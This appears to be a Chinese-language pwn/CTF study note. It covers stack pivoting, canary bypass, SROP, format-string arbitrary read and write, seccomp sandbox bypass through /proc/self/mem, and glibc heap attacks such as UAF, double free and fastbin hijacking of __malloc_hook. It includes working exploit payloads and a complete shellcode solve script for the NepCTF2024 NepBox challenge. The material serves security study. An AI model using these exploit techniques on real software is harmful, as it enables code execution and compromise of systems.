> **覆盖ebp为非法伪造的地址（堆或bss段），覆盖返回地址为** **`pop ebp; ret`** **或** **`leave; ret`** **的gadget地址，执行到leave（即 mov esp, ebp; pop ebp ）先esp和ebp同时指向覆盖后的ebp位置【vuln ebp】，接着vuln ebp地址pop给ebp，此时ebp指向恶意伪造地址，esp＋1后，指向返回地址，esp指向返回地址执行`mov esp, ebp`，使esp和ebp同步，栈完成迁移，新栈中提前构建好ROP链，即可完成利用**

**原理示意**

![img](/img/pwn_note.zh-cn.assets/-172844664601118.assets)

有`system`函数`plt`，有`rop`链，得到`ebp`栈地址，无`/bin/sh`字符串，需自行输入，有如下漏洞点：

```C
return read(0, buf, 0x40uLL); // buf 0x30
```

构造payload，实行**纯栈**上的栈迁移

```Python
bin_sh_addr = ebp_addr - 0x8
payload2 = 0x8*b'a'           + p64(ret_addr)     + \\
           p64(pop_rdi_addr)  + p64(bin_sh_addr)  + \\
           p64(system_addr)   + b'/bin/sh\x00'    + \\
           p64(ebp_addr-0x30) + p64(leave_ret_addr) \\
```

![img](/img/pwn_note.zh-cn.assets/-172844664601119.assets)

### Canary绕过

1. 格式化字符串读取canary的值，canary最后一个值一定是"\x00"，可以覆盖该值来用`%s`读取，然后栈溢出再覆盖为00
2. canary爆破，针对存在fork函数，复制出来的程序内存布局都一样，子进程报错退回父进程，canary不变
3. Stack mashing：触发SSP Leak
4. 劫持 __stack_chk_fail，修改got表中该函数地址

### SROP

Sigreturn Oriented Programming

sigreturn是一个系统调用，在unix系统发生signal时会被间接调用，用户层调用，地址保存在栈上，执行后出栈，用户进程上下文保存在栈上，且内核恢复上下文时不校验

- Linux i386下调用sigreturn的代码存放在vdso中
- Linux x86_64通过调用15号syscall调用sigreturn

## 格式化字符串

格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数

当格式化字符串数量多于变参数量，出现不可预知情况：

```C
printf("%#lx %#lx %#lx %#lx %#lx", 1, 2, 3);
//会依次解析后面的寄存器中的内容
//0x1 0x2 0x3 0x7f17717e6f10 0x7f177180c040
```

劫持程序的控制流：**关键变量、Got表[存放延迟绑定之后libc的函数，在libc中的实际的虚拟地址]、返回地址、hook函数、fini_array...**

**示例**

```C
char buf[0x100];
int string_len;

string_len = 0;
printf("%300c%3$hn\n", 'A', 0, &string_len);//局部变量string_len的地址
//%300c：指定字符参数的输出字段的宽度300
//%3$hn：位置参数说明符，引用参数列表中的第三个参数 (&string_len)
//%hn：以short int的类型，2个字节，往第三个参数指向的内存地址写入一个值，输入给该变量
//此时string_len为300    300：0000 0001 0010 1100
printf("I got length: %d\n", string_len);

string_len = 0;
printf("%300c%3$hhn\n", 'A', 0, &string_len);
//%hhn：char类型，一个字节，以一个字节往其中写，截去高8个bit，300: 0010 1100 = 44 
//%n：int类型，四个字节
printf("I got length: %d\n", string_len);
```

![img](/img/pwn_note.zh-cn.assets/-172844664601120.assets)

**32位**情况下，在**栈上找参数，打印出栈上父函数的内容**

```C
printf("%08x.%08x.%08x");
```

gdb调试

![img](/img/pwn_note.zh-cn.assets/-172844664601121.assets)

![img](/img/pwn_note.zh-cn.assets/-172844664601122.assets)

**64位**

`%p`函数输出顺序是：`rdi, rsi, rdx, rcx, r8, r9, 栈rsp往rbp`，`rdi`可能作为输入的参数，不打印

**语法**

- `$`：$前加一个数字k，使得指定打印的第k个参数，即栈上后的第k个地址【任意地址写】
- `%c`：【任意地址写】
- `%p`：输出栈中的值，一般为指向字符串的地址【地址泄露】
- `%s`：输出字符串，即将栈中的值以地址进行解析，输出该值（作为指针）指向的字符串内容（存于数据段），若该值不能解析为地址则程序崩溃
- `%n, %hn, %hhn`(half)：同%s是以地址解析，向对应参数地址写入%前方已经打印成功的字符**的个数**【任意地址写】，且分别是以4字节、2字节、1字节进行输入
- `%a`：以double型的16进制格式输出栈中变量，当程序开了FORTIFY机制后，程序编译时所有printf函数被替换为__printf_chk函数，使用%a输出栈上方的数据
- %lx：unsigned long int（长整型）
- %x：unsigned int（整型）
- %#x：十六进制
- %#o：八进制
- %#d：十进制
- %c：输出单个字符

**测试**

通过该方法测试效果，不断调整%后的数来调整，同时保证整个payload是8的倍数，接着调试修改p为s和n

```Python
payload = b"abcdefghijk" + b"%22$p" + p64(addr)
```

**任意地址读**

**地址泄露**如PIE，libc，stack等，后在栈上构造地址，利用%n（或%hn，%hhn）实现任意地址写入任意值；

```Bash
AAAA%p %p %p %p# 用于测试printf(input) 找到输入字符的偏移
AAAA0xab 0xcd 0xef 0x41414141 # 此时偏移为4输出

payload = p32(got_addr) + b"%4$s" # %4 偏移四个输出以该地址解析的值

payload = 'AAAAAAAABBB%10$s' + p64(0x404050) 
# 偏移10个输出0x404050地址中的值, s改为n就是写入4字节, 值为0xb
```

如下图，若用户可以自己构造格式化字符串，可达到泄露read的got表地址

![img](/img/pwn_note.zh-cn.assets/-172844664601123.assets)

**任意地址写**

```Bash
# 覆盖大数字
# 任意读的同样方法获取偏移, 假设为6, p32(addr)4字节，填入12个a
payload = p32(addr) + b'a'*12 + b'$6%n' # 向addr中填入数字16

# 覆盖小数字
# aa%8 为一个4字节参数, $naa 为一个4字节参数, 所以addr为第 6+2 = 8个参数 
payload = b'aa%8$naa' + p32(addr) # 向addr中填入数字2
```

![img](/img/pwn_note.zh-cn.assets/-172844664601124.assets)

漏洞点：

```C
char buf; // [esp+2Ch] [ebp-5Ch]
memset(&buf, 0, 0x50u)        //将buf的地址开始的0x50字节的内存区域都设置为0
read(0, &buf, 0x50u); // 或scanf输入buf
printf(&buf);    //buf可控，格式化字符串漏洞
```

32位read输入后，执行到将要执行printf时，找栈顶esp与输入的值的距离

```C
00:0000│ esp         0xffffcfa0 —▸ 0xffffcfcc ◂— 'AAAAAAAA\n'
01:0004│             0xffffcfa4 —▸ 0xffffcfcc ◂— 'AAAAAAAA\n'
02:0008│             0xffffcfa8 ◂— 0x50 /* 'P' */
03:000c│             0xffffcfac —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
04:0010│             0xffffcfb0 —▸ 0xf7fc4540 (__kernel_vsyscall) ◂— push   ecx
05:0014│             0xffffcfb4 ◂— 0xffffffff
06:0018│             0xffffcfb8 —▸ 0x8048034 ◂— push   es
07:001c│             0xffffcfbc —▸ 0xffffd0e4 —▸ 0xffffd293 ◂— 0x6d6f682f ('/hom')
08:0020│             0xffffcfc0 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f
09:0024│             0xffffcfc4 ◂— 0x20 /* ' ' */
0a:0028│             0xffffcfc8 ◂— 9 /* '\t' */
0b:002c│ eax ebx ecx 0xffffcfcc ◂— 'AAAAAAAA\n'    //对于printf是第12个参数
0c:0030│             0xffffcfd0 ◂— 'AAAA\n'        //接上，但对格式化字符串$是第11个参数
0d:0034│             0xffffcfd4 ◂— 0xa /* '\n' */
0e:0038│             0xffffcfd8 ◂— 0x0
```

漏洞点：

```C
char v10[24];    // [rsp+20h] [rbp-20h]    需要知道的地址
_isoc99_scanf("%ms", &format);    //读取一个字符串并动态分配内存
printf(format);//用泄露方法泄露栈上地址
```

在栈上找到flag地址，若为64位，则又要注意参数的位置

```C
00:0000│ rsp 0x7fffffffde10 ◂— 0x41fc1000
01:0008│     0x7fffffffde18 —▸ 0x602ca0 ◂— 'AAAAAAAA'
02:0010│     0x7fffffffde20 —▸ 0x6022a0 ◂— 0x602
03:0018│     0x7fffffffde28 —▸ 0x7fffffffde30 ◂— 0x64786d7b67616c66 ('flag{mxd')//为$9，前有5个参数，栈上数4个
04:0020│     0x7fffffffde30 ◂— 0x64786d7b67616c66 ('flag{mxd')
05:0028│     0x7fffffffde38 ◂— 0x5f345f6e77705f77 ('w_pwn_4_')


*RAX  0x0
 RBX  0x0
 RCX  0x7ffff7e97a37 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x1
 RDI  0x602ca0 ◂— 'AAAAAAAA'
 RSI  0x1
 R8   0x7ffff7f9ea70 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x602ca0 ◂— 'AAAAAAAA'
 R10  0x7ffff7d93098 ◂— 0xf001200000e31
 R11  0x246
 R12  0x7fffffffdf68 —▸ 0x7fffffffe291 ◂— 0x736a2f656d6f682f ('/home/js')
 R13  0x4007a6 (main) ◂— push   rbp
 R14  0x0
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
 RBP  0x7fffffffde50 ◂— 0x1
 RSP  0x7fffffffde10 ◂— 0x41fc1000
*RIP  0x40088b (main+229) ◂— call   0x400640
```

使用格式化字符串漏洞泄露栈地址，若main函数调用了foo函数，foo函数存在该漏洞，又需要泄露的目标栈地址在IDA中可见与ebp（此处的ebp为main函数的栈底）的距离，可劫持foo函数栈帧中的ebp（该ebp指向prev ebp即main函数的ebp）。

![img](/img/pwn_note.zh-cn.assets/-172844664601225.assets)

linux程序执行流程：

![img](/img/pwn_note.zh-cn.assets/-172844664601226.assets)

```C
read(0, &v5, 0x100uLL);  // 从标准输入读取最多0x100（256）字节的数据到v5中
//等价于read(0, buf, 0x100uLL);
printf((const char *)&v5, &v5);  // 将v5的内容作为字符串格式打印到标准输出
//等价于printf(buf)
```

**全局变量**

当存在**比较时**可判断该变量是否为全局变量(`i`)，一般在bss段，若是则可以直接获取其地址进行格式化字符串覆盖绕过**比较**

```C
.bss:000000000040408C i               dd ?                    ; DATA XREF: main:loc_401404↑r
```

## 沙箱Sandbox

绕过：查看ret2syscall中orw绕过

限制execve导致不能使用onegadget和system调用，一般两种方式开启沙箱

- 采用prctl函数调用
- 使用seccomp库函数

**seccomp**

```c
v = seccomp_init(111LL); // 初始化，参数表示用于过滤的操作模式
seccomp_rule_add(v, 0LL, 59LL, 0LL); // 禁用59系统调用号execve
seccomp_load(v); // 加载过滤器
```



### /proc泄露

- 保护全开，提供`open`，`read`，`write`，`lseek`函数

```C
open: 
O_RDONLY        00000000
O_WRONLY        00000001
O_RDWR          00000002
```

- **lseek**函数：在文件中移动文件指针的位置

```C
off_t lseek(int fd, off_t offset, int whence);// 返回文件指针偏移值 或 -1
// fd: 文件描述符   offset: 相对于whence的偏移量   
// whence: 文件指针基准位置【SEEK_SET 0 开头, SEEK_CUR 1 当前, SEEK_END 2 结尾】
```

**/proc 文件系统**

1.  Linux内核提供的一种**伪**文件系统，运行时可访问、设置内核内部数据结构，只存在内存中，不占外存空间
2. `/proc/self/maps`: 得到当前进程内存映射关系，等价于pwndbg中的`vmmap`，open只可读，**可获取内存代码段基址**

```C
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555555000 r--p     1000 0      /home/zhou/pwn
// 0x555555554000 即为文件基址
```

1. `/proc/self/mem`: 进程内存内容，open可读可写，修改该文件等效于直接修改当前进程内存，**结合maps及IDA确定偏移量以及lseek修改文件指针进行读取修改**

![img](/img/pwn_note.zh-cn.assets/-172844670575243.assets)

**绕过利用**

```C
// open时文件包含flag将会报错
if ( strstr(filename, "flag") ){ // filename中查找第一次出现"flag"的位置
    exit(0);
}

// IDA
.rodata:000000000000216C needle          db 'flag',0             ; DATA XREF: Open+4D↑o
```

通过maps泄露基址且加上IDA中偏移使用lseek和mem将'flag' write更改为别的字符串可绕过检查

### Ptrace进程

**__WAIT_STATUS**

```C
// 定义了__WAIT_STATUS [union: 共用同一块内存,兼容系统]
typedef union {
    // 都用于表示进程状态
    union wait *__uptr; // 早期系统 指向 union wait 类型的指针
    int *__iptr;        // 现代系统 指向        int 类型的指针
} __WAIT_STATUS __attribute__ ((__transparent_union__));


// IDA 
__WAIT_STATUS stat_loc; // 存储进程状态的变量 用于判断进程是否在系统调用的标志
HIDWORD(stat_loc.__iptr) = 0; // iptr指针指向的地址(64位)的高32位置为0 对应源码 int in_syscall = 0
wait((__WAIT_STATUS)&stat_loc); // 父进程等待子进程系统调用, 状态存储在stat_loc

if ( ((__int64)stat_loc.__uptr & 0xB00) == 0xB00 ) // __uptr 对应源码的 int status
// Linux 进程状态码 以宏解读: -> 判断是否遇到段错误
// 0x100：子进程被跟踪 (ptraced)
// 0x200：子进程遇到一个致命信号（如段错误）
// 0x800：子进程在执行系统调用时发生错误

LOBYTE(stat_loc.__uptr) != 127 // LOBYTE获取低8位, 127为 wait(pid) pid标识的命令未知的退出状态值
```

**fork**

```C
v = fork(); // 子进程中返回0，父进程中返回子进程的PID
v & 0x80000000 != 0 // 判断 v 有符号数的最高位是否为1，为1则为负数，为0则为正数，判断v是否为负数
if(!v) {}  // 进入子进程
```

**ptrace：断点调试和系统调用跟踪**

```C
// 一个进程可观察和控制另一个进程的执行
ptrace(enum __ptrace_request op, pid_t pid,void *addr, void *data);

v1 = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL); // 指示该进程由父进程跟踪, 后续参数忽略
v1 = ptrace(PTRACE_ATTACH, pid, 0LL, 0LL); // 跟踪调试指定pid进程, 此时子进程等待, 父进程可使用ptrace调试
ptrace(PTRACE_SYSCALL, v, 0LL, 0LL); // 重新启动停止的子进程 or 挂起子进程，直到子进程发出系统调用，父进程拦截处理
ptrace(PTRACE_KILL, a1, 0LL, 0LL); // 杀掉子进程

ptrace(PTRACE_GETREGS, pid, 0LL, vg); // 获取子进程寄存器状态, 内容存在vg中
// 源码
rax = regs.orig_rax;  // IDA中源码将显示 v13 = v26等 需要判断
rdi=regs.rdi; 
rsi=regs.rsi; 
rdx=regs.rdx; 
rcx=regs.rcx; 
rip=regs.rip;

ptrace(PTRACE_SETREGS, pid, 0LL, vg); // 设置子进程pid的寄存器值为vg内容
```

**例子：NepCTF2024——NepBox**

- **子进程**：前提mmap了一段地址0xDEAD000，这段空间不仅可以布置shellcode，还可以在更高的地方存放泄露的flag内容，可以向该地址写入shellcode，且会由子进程执行
- **父进程**：会在子进程调用系统调用前拦截并对系统调用运用**白名单**处理，，采用open，read，write到stdout获取flag值

```C
case __NR_openat: 
    permission=rdx; 
    goto OpenFile; 
case __NR_open: 
    permission=rsi; // rsi != 1
OpenFile: 
    if(permission){ 
        ExitAndKillPid(pid); 
    } 
    break; 
case __NR_read: 
    printf("read(%d,%p,0x%x);\n",rdi,rsi,rdx); 
    break; 
case __NR_write: 
    choice=rand()%number; 
    regs.rsi=say[choice]; 
    regs.rdx=strlen(say[choice]);
    ptrace(PTRACE_SETREGS, pid, NULL, &regs); // 会更改rsi和rdx，flag输出换为其他内容
    break;
```

**汇编编写open, read, write shellcode+基于时间的盲注**

```Python
from time import time # 用于时间盲注
p=process('./NepBox')
base=0xdead000
'''
    /* open(file='/flag', oflag=0, mode=0) */
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f /* '/flag' */
    xor [rsp], rax /* 异或后恢复为/flag */
    
    mov rdi, rsp 
    
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
'''

shellcode=shellcraft.open("/flag",0)+'''
    /* call read(3, 0xdead200, 0x30) */
    xor eax, eax /* SYS_read 0 */
    
    push 3
    pop rdi
    
    push 0x30
    pop rdx
    
    mov esi, 0x1010101 /* 0x1010101 ^ 0xcebd301 = 233492992 == 0xdead200 */
    xor esi, 0xcebd301
    syscall

/* 
   stdout=1
   for(int bytes=0;bytes<=0x30;bytes++){ iLoop
       for(int bits=0;bits<=0x7;bits++){ jLoop
             write(stdout,0xdead200+bits+bytes*8,0x1);
       }
   }
*/
    mov r13,0             /* 偏移量——当前第几个字节:bytes */
    mov r14,0xdead200     /* 基址   */

iLoop: /* 外层循环 遍历每个字节 */
    mov r15,0 /* 当前字节第几位: bits */
jLoop: /* 内层循环 遍历每个位 */
    lea rax,[r13+r14] /* rax内容置为r13+r14地址 */
    mov ax,[rax] /* rax中地址指向的内容: 16位 */

    mov rcx,r15 /* rcx 当前位 */
    shr ax,cl /* 右移将最低位设置为要读取的位 */

    and ax,1 /* & 0x00000001 取最低位的值 */
    test ax,ax /* 检查当前位是 0 还是 1 */
    jz zero

one: /* 进行基于时间的盲注，使得该位为1的时候时间为大于0秒 */
    mov r8,0x200000000 /* 不同机器需要变更该延时时间 */
sleep:
    sub r8,1
    jnz sleep /* 延时操作 */
    
zero:
    /* write(fd=1, buf=0xdead200+[r13], n=0x1) */
    push 1
    pop rdi

    push 0x1
    pop rdx
    
    mov esi, 0x1010101 /* 233492992 == 0xdead200 */
    xor esi, 0xcebd301
    add rsi,r13
    
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall

jLoopEnd:
    add r15,1 /* 
    cmp r15,7
    jbe jLoop
iLoopEnd:
    add r13,1
    cmp r13,0x30
    jbe iLoop
'''
p.sendafter('input',asm(shellcode))
flag=''

while len(flag)==0 or flag[-1]!='}':
    s=0
    for i in range(8):
        now=time()
        p.recvuntil('!')
        interval=int(time()-now)
        if interval: # 当时间差为 1 时
            s|=(1<<i) # 在第 i 位上产生一个 1 加入到 s 中, 8 次构成一个字节
    flag+=chr(s)
    print(flag)

p.interactive()
```

## 堆溢出漏洞

![img](/img/pwn_note.zh-cn.assets/-172844670575344.assets)

### 函数实现

#### Malloc

- libc-2.27

```C
void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook);
if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
```

`malloc`函数是调用了`__libc_malloc`函数，检查完`__malloc_hook`的值是否为空，不为空则调用其指向的函数，利用方法为向`__malloc_hook`的地址写入one_gadget或其他函数(system)劫持

### 堆管理器

如栈基础第一张图所示

用户与OS之间作为动态内存管理的中间人，由libc.so.6链接库实现，封装了系统调用（申请内存的 `brk` 与 `mmap` ），存在于【shared library即mmap段】

- 响应用户申请内存，向OS申请内存，返回给用户程序
- 管理用户释放的内存，适时归还OS

__brk(sys_brk) ：堆通过brk向bss段和data数据段扩展【主线程、子线程可用】

__mmap(sys_mmap_pgoff) ：物理内存/磁盘映射到虚拟内存中，未进行新的申请，在mmap段直接映射获取【子线程可用】

**各种堆管理器**

1. dlmalloc - General purpose allocator
2. ptmalloc2 - **glibc**
3. jemalloc - FreeBSD and Firefox
4. tcmalloc - Google
5. libumem - Solaris

#### arena

内存分配区

```
操作系统 --> 堆管理器 --> 用户
物理内存 -->   arena   --> 可用内存
//arena的标头详细信息 glibc-2.23

struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);        // 定义了一个mutex锁，4字节
  /* Flags (formerly in max_fast).  */
  int flags;                           // 4字节

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];    
  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;
  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;
  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;
  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;
  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */

  INTERNAL_SIZE_T attached_threads;
  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};

typedef struct malloc_state *mstate;
```

#### chunk

用户申请内存的基本单位，malloc返回的指针指向一个chunk的数据区域

```C
// chunk在glibc中的实现
struct malloc_chunk {
 
  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
 /*
     假如最低的chunk单位为8字节，所以大小补齐必须为8的倍数，则最低三位只能为0，于是将该三位作为控制位
 */
 
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
 
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

1. 当其为malloced chunk时，用prev size 和 size 2个字段；若其前的chunk也为malloced chunk时，只用size 1个字段
2. 当其为fast bin时，用到prev_size, size, fd 3个字段
3. 当其为small bin或unsorted bin时，用到prev_size, size, fd, bk 4个字段
4. 当其为large bin时，用到所有6个字段

amd64下最小chunk为32字节(0x20)，malloc(0x10)导致申请了0x20的chunk；x86下最小chunk为16字节(0x10)

| prev size 0x8                  |
| ------------------------------ |
| size        0x8                |
| 0x8       ← **malloc返回指针** |
| 0x8                            |

**prev size复用**

当前面的chunk多申请了0x8则prev size可以用于存放数据，因为只有前chunk为free chunk，prev size才有意义；即申请**0xn8**与**0xn0**是完全一致的

**标志位（AMP）：**

- **A（NON_MAIN_ARENA）**：A=0 主分区，A=1 为非主分区分配
- **M（IS_MAPPED）**：M=1表示使用mmap映射区域，M=0为使用heap区域
- **P（PREV_INUSE）**：P=0 表示pre_chunk空闲可合并，mchunk_prev_size才有效，P=1表示前一个chunk被分配，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1

##### malloced chunk

一般申请0xn0的堆后，实际的堆大小为0xn8

![img](/img/pwn_note.zh-cn.assets/-172844670575345.assets)

##### free chunk

![img](/img/pwn_note.zh-cn.assets/-172844670575346.assets)

![img](/img/pwn_note.zh-cn.assets/-172844670575347.assets)

##### top chunk

- 本质上是free chunk，向操作系统申请到的内存减去malloc用掉的那一部分后剩余的内存由top chunk管理
- **当申请的最后一个堆块进行`free`时，将会直接并入`top chunk`，通常利用来隔开`top chunk`**

##### last remainder chunk

分配chunk给用户时，用户取走后剩余的那一部分

#### bin

管理arena中空闲chunk的结构，以数组形式存在，数组元素为相应大小的chunk链表的链表头，存在于arena的malloc_state中

**先找fast bins和small bins，然后找unsorted bin，仍找不到则触发unsorted bin遍历，合并分类，再去对应small bins和large bins找，仍找不到则在top chunk中划分一些**

##### unsorted bin

- 循环双向链表，FIFO，**插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**，b[1]，视为空闲chunk回归其所属bin（small bin和large bin）之前的缓冲区，大于0x80的先进入unsorted bin
- malloc---->遍历时将会进行【sort分类到其他bins中】以及【合并free chunk】，故不能先unsorted bin attack任意地址写后再遍历，因为遍历时会程序崩溃
- 当malloc小于unsorted bin大小的块时，会将unsorted bin中堆块**切割**后返回

![img](/img/pwn_note.zh-cn.assets/-172844670575348.assets)

##### fast bins

单向链表**LIFO**，管理16、24、32、40、48、56、64 Bytes的free chunk（32位下默认）；其中chunk的 P位总为**1**，且fast bin不进行**合并**操作，操作都是对链表尾，`malloc(0) ~ malloc(0x70)`

```
fastbin --> third_free_chunk --> second_free_chunk --> first_free_chunk <-- 0x00
```

![img](/img/pwn_note.zh-cn.assets/-172844670575349.assets)

##### Tcache

glibc-2.26 (ubuntu 17.10) 后引入，扩大版fastbin，无double free机制，**LIFO**

![img](/img/pwn_note.zh-cn.assets/-172844670575350.assets)

引入2个新结构体：

- `tcache_entry`：链接空闲chunk，next指针指向下一个大小相同的chunk的user data处，并会复用空闲chunk user data部分

```C
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
```

- `tcache_perthread_struct`：单向链表方式链接了相同大小的空闲free chunk，counts记录空闲chunk数，每条链上最多7个chunk

```C
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

# define TCACHE_MAX_BINS                64

static __thread tcache_perthread_struct *tcache = NULL;
```

![img](/img/pwn_note.zh-cn.assets/-172844670575451.assets)

**工作机制：**

1. 第一次申请，会malloc一块内存放`tcache_perthread_struct`（可gdb调试看到0x251的大小）
2. free的chunk小于small bin size时，放入tcache，塞**满**7个后，大小相同的free chunk进入fastbin或unsorted bin；tcache中**chunk不合并**
3. 申请在tcache范围时，先tcache直到空，再去bin找；tcache为空，若fastbin/smallbin/unsorted bin有size符合的chunk，填入tcache直到塞满，之后从tcache中取（**此时chunk在bin中和tcache中顺序颠倒**）

##### small bins

- 每个bin中的chunk大小都相等，bins[2] ~ bins[63]，62个循环双向链表，FIFO 
- 管理16、24、32、40、...、504 Bytes的free chunks（32位下）

![img](/img/pwn_note.zh-cn.assets/-172844670575452.assets)

##### large bins

- 每个bin中的chunk大小是一个范围，不相等
- bins[64] ~ bins[126]，63个循环双向链表，FIFO，管理大于504 Bytes的free chunks（32位下）
- 1 bin          2 bins          4 bins          8 bins          16 bins          32 bins
- any            262144b      32768b        4096b          512b              64b
- 每个bins里是一个范围，但都以上一行的值进行递增

![img](/img/pwn_note.zh-cn.assets/-172844670575453.assets)

### UAF

**Use after free**：内存块被释放之后再次被使用，关键在于**指针未被设置为NULL**，即原先指针并没有消失，只是由fastbins或tcache中新增出了指针将chunk连成链表

**漏洞点：**

```C
void func1(){ printf("func1\n");}
void hack(){ printf("hack\n");}
struct Pfunc{ void (*p)();};    //
  
int main()
{
    struct Pfunc* lpfunc = malloc(8);
    lpfunc->p = func1;
    lpfunc->p();    //"func1"
 
    free(lpfunc);
 
    long* hack_point = malloc(8);
    *hack_point = hack;
 
    lpfunc->p();    //"hack"
    return 0;
}
```

- fastbins使用LIFO，后进先出，所以申请同样大小的chunk，会使用最后一次free的chunk，此时可达到 **hack_point指针 与 lpfunc指针 指向同一个地址【刚才free的chunk地址】**
- 调试中，fastbins指向的地址为0x0804b000，而两指针指向的地址为0x0804b008，由于malloc指针指向data，而fastbins指向prev_size，prev_size 和 size 在32位下刚好占8字节，所以偏移了8

```C
o = malloc(0x28uLL);    
free(o);
s = (char *)malloc(0x20uLL); 
fgets(s, 32LL, stdin);    //向s指向的地址写数据
free(s);
(*((void (__fastcall **)(void *))o + 3))(o);
```

利用：

![img](/img/pwn_note.zh-cn.assets/-172844670575454.assets)

o+3是调用func1，但篡改后相当于调用了shellcode

**hacknote**基本实现：一次malloc两个堆块，且第一个堆块固定为8字节，第二个堆块自己申请

![img](/img/pwn_note.zh-cn.assets/-172844670575455.assets)

此处也存在**漏洞点**：打印为`(*notelist[i])(notelist[i])`调用puts打印content内容（32位下）

利用方法：先申请两个远大于0x8的note0, note1，共4个堆块，删除0，删除1，进入相应fastbin中，再申请0x8的note并修改print_note，调用print_note即调用system函数

![img](/img/pwn_note.zh-cn.assets/-172844670575456.assets)

#### Double free

glibc-2.23

- 堆上某块内存被释放后，未将指向该堆块的指针清零，对该内存进行再次free，达成任意地址写，**注：不可以直接连续两次free，会被`_int_free`检测到fastbin double free**
- free掉chunk时，判断 chunk 大小和所处位置，若 chunk_size <= max_fast 且 chunk 不位于 heap 的顶部（即不与 top chunk 相邻），则将 chunk 放到 fast bins 中

申请2个0x60的堆块【1,2】进行如下操作：

```Python
free(1) 
free(2)
free(1) # 均进入 fast bins
```

![img](/img/pwn_note.zh-cn.assets/-172844676894871.assets)

调用 malloc 返回 chunk1 ，修改 chunk1 内容来修改其 fd 指针指向恶意地址，在第四次 malloc 可实现在任意地址分配 fastbin 块，后续利用malloc_hook劫持为one_gadget：**`fastbin Arbitrary Alloc`**

### fast bin attack

**任意地址写**

Fastbin attack：修改fastbin指针指向伪造的fake_chunk

![img](/img/pwn_note.zh-cn.assets/-172844676894972.assets)

1. 先堆叠2和4，释放2到fastbin，用4填写入fd为fake chunk地址，size最后一位须设置为1
2. 申请一次为2，申请第二次为fakechunk，即可以在fakechunk处任意读写

#### Arbitrary Alloc

- 劫持fastbin到任何地址（bss, heap, data, stack），可覆盖`malloc_hook`地址为`one_gadget`，然后执行malloc劫持获得shell
- 使用**字节错位**来实现直接分配 **fastbin** 到**_malloc_hook** 的位置，64位程序中fastbin范围【0x20-0x80】，此时`0x7f403c467aed`的地址后的`0x000000000000007f`错位出了合理的`chunk`中的`size`域，`0x7f`在计算fastbin index时，属于chunk大小为0x70的，而chunk又包含了0x10的header，**因此选择malloc构造时选择分配0x60或0x68的fastbin，最后fastbin attack时同样申请0x60或0x68的chunk**
- 伪造堆块`fake_chunk`绕过检查机制：`size`位需要`0xnf`(111)而非`0xn1`(001)

```C
static void do_check_remalloced_chunk(mstate av, mchunkptr p, INTERNAL_SIZE_T s)
{
    INTERNAL_SIZE_T sz = chunksize_nomask(p) & ~(PREV_INUSE | NON_MAIN_ARENA);
    if(!chunk_is_mmapped(p)) // p 为 1 绕过检查
    {
        assert (av == arena_for_chunk(p));
        if(chunk_main_arena(p))
            assert(av == &main_arena);
        else
            assert(av != &main_arena);
    }
    do_check_inuse_chunk(av, p);
}
```

`gdb`调用具体细节

```C
pwndbg> x/20gx 0x7f403c467b10 - 0x23
0x7f403c467aed <_IO_wide_data_0+301>:        0x403c466260000000        0x000000000000007f
0x7f403c467afd:                              0x403c128ea0000000        0x403c128a7000007f
0x7f403c467b0d <__realloc_hook+5>:           0x000000000000007f        0x0000000000000000
                       malloc_hook:             4 3 2 1 0 f e d           c b a 9 8 7 6 5
0x7f403c467b1d:                              0x0000000000000000        0x0000000000000000
0x7f403c467b2d <main_arena+13>:              0x828a2b80c0000000        0x403c467aed000055
0x7f403c467b3d <main_arena+29>:              0x000000000000007f        0x0000000000000000
0x7f403c467b4d <main_arena+45>:              0x0000000000000000        0x0000000000000000

pwndbg> x/gx 0x7f403c467b10
0x7f403c467b10 <__malloc_hook>:        0x0000000000000000
//想要劫持的 __malloc_hook 地址
```

劫持malloc_hook构造的payload填入的位置为【malloc_hook地址 - 0x23 + 0x10】或者【malloc_hook地址 - 0x23】，即修改fd指向该位置，data进入的位置是在`prev_size`和`size`域后面的，一般直接填入`b"a" * 0x13 + p64(one_gadget)`，0x13换为需要的padding

![img](/img/pwn_note.zh-cn.assets/-172844676894973.assets)

